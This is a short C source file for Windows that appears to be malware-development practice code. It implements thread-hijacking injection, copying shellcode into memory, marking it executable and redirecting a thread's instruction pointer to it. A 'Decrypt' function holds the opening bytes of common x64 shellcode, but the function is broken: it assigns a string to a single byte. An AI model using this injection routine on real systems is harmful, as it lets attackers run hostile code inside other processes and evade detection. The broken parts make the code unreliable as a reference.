#include"func.h"
#include<windows.h>
#include<stdio.h>


BOOL ThreadHijack(IN HANDLE hThread, IN PBYTE pShell, IN SIZE_T sShellSize) {


	/*Initialisation ROUJIII */
	BOOL verifier = FALSE;
	CONTEXT ThreadCtx = {
	.ContextFlags = CONTEXT_ALL };
    PVOID pBuffer = NULL;
	DWORD OldProtect = NULL;


	/*Allocating a memory space for the shellcode */

	pBuffer = VirtualAlloc(NULL, sShellSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (pBuffer == NULL) {

		printf("[!] error on reserving memory \n");
		return FALSE;
	}

	printf("[+] MEMORY Reserved Succesfully -__- \n");
	memcpy(pBuffer, pShell, sShellSize);

	verifier = VirtualProtect(pBuffer, sShellSize, PAGE_EXECUTE_READWRITE, &OldProtect);

	if (verifier == FALSE) {

		printf("[!] error on Changing protection memory \n");
		return FALSE;
	}

	
	verifier = GetThreadContext(hThread, &ThreadCtx);


	if (verifier == FALSE) {

		printf("[!] error on Getting Thread Context \n");
		return FALSE;
	}

	printf("[+] Getting ThreadContext DONE Succesfully -__- \n");
	ThreadCtx.Rip = pBuffer;

	verifier = SetThreadContext(hThread, &ThreadCtx);


	if (verifier == FALSE) {

		printf("[!] error on UPdating Thread Context \n");
		return FALSE;
	}

	printf("[+] Hijacking DONE Succesfully -__- \n");
	return TRUE;
}
VOID Myfunc() {

	printf("am Here");
}
VOID Decrypt(IN PBYTE pShell) {

	pShell[1] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50";
}